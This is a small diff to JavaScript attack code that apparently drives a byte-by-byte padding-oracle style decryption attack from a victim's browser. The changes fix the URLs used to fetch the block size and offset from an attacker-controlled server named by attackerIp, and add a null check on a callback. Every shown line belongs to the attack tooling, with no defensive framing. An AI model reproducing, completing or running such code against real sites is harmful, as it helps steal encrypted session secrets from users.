@@ -11,7 +11,7 @@ function sendRequest(method, url, data, callback, errorcallback, timeout) {
 	request.responseType = 'text';
 	request.timeout = timeout || 5000;
 	request.onload = function() {
-		callback(request.responseText);
+		callback && callback(request.responseText);
 	}
 	request.onerror = function() {
 		errorcallback && errorcallback(request.status, request.statusText)
@@ -27,7 +27,7 @@ function attackByteAttempt(path, data, success) {
 }
 
 function attackByte(dataLengthNeeded) {
-	sendRequest('GET', attackerIp + "/offset", null, function(response) {
+	sendRequest('GET', 'http://' + attackerIp + "/offset", null, function(response) {
 		var offset = parseInt(response, 10);
 		data = "";
 		path = "";
@@ -43,7 +43,7 @@ function attackByte(dataLengthNeeded) {
 // Get block size
 var blockSizeString = ""
 
-sendRequest('GET', attackerIp + "/blocksize", null, function (response) {
+sendRequest('GET', 'http://' + attackerIp + "/blocksize", null, function (response) {
 	blockSize = parseInt(response, 10);
 	attackByte(blockSizeString.length);
 }, null, 30000);
